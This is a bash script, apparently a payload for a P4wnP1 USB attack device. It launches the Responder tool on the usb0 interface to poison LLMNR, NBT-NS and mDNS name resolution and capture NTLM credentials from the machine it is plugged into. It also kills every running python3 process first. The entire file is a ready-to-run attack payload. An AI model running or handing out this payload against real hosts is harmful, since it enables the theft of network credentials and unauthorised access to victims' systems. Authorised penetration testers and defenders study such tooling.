#!/bin/bash
# payloads/network/responder_attack.sh
######################################

### Description: Launches Responder for NTLM, LLMNR, and MDNS poisoning
### Requirements: Responder (clone into /opt/p4wnp1/tools/Responder)

PAYLOAD_NAME="responder_attack"
RESPONDER_DIR="/opt/p4wnp1/tools/Responder"
LOG_DIR="/opt/p4wnp1/logs"

mkdir -p "$LOG_DIR"

pkill python3 || true

if [ ! -d "$RESPONDER_DIR" ]; then
  echo "[!] Responder not found in $RESPONDER_DIR"
  exit 1
fi

cd "$RESPONDER_DIR"

# Launch Responder with default poisoning options
python3 Responder.py -I usb0 -wFb -v > "$LOG_DIR/${PAYLOAD_NAME}.log" 2>&1 &

sleep 1

echo "[+] Responder attack started on interface usb0. Logs in $LOG_DIR/${PAYLOAD_NAME}.log"
exit 0
